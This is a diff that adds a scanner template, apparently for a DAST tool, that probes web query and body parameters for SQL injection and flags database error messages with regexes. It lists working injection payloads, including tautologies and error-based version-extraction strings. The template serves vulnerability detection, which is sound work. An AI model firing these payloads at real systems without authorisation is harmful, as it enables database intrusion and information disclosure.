@@ -1,0 +1,49 @@
+id: reconx-sqli-error
+
+info:
+  name: ReconX SQL injection error signatures
+  author: reconx
+  severity: high
+  description: |
+    Sends common SQL meta-characters and matches database error strings.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: reconx,sqli,dast
+
+http:
+  - payloads:
+      sqli:
+        - "'"
+        - '"'
+        - "' OR '1'='1"
+        - "1' ORDER BY 10--"
+        - "1' AND 1=CONVERT(int,@@version)--"
+        - "' AND extractvalue(1,concat(0x7e,version()))--"
+        - "') OR ('1'='1"
+        - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - '{{sqli}}'
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - '{{sqli}}'
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)you have an error in your sql syntax'
+          - '(?i)unclosed quotation mark after the character string'
+          - '(?i)quoted string not properly terminated'
+          - '(?i)sqlstate\[[0-9a-z]+\]'
+          - '(?i)ora-[0-9]{5}'
+          - '(?i)sqlite3?\.operationalerror'
+          - '(?i)microsoft ole db provider for sql server'
+          - '(?i)pg_query\(\)'
+          - '(?i)syntax error at or near'
